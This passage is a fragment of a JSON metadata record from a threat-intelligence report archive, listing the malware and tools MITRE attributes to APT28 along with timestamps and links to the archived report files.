                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673536027,
    "ts_updated_at": 1743041724,
    "ts_creation_date": 1672273992,
    "ts_modification_date": 1672273992,
    "files": {
        "pdf": "https://archive.orkl.eu/f3de869837814afffd60e6668d5fe38b2f3d1da6.pdf",
        "text": "https://archive.orkl.eu/f3de869837814afffd60e6668d5fe38b2f3d1da6.txt",
        "img": "https://archive.orkl.eu/f3de869837814afffd60e6668d5fe38b2f3d1da6.jpg"
    }
}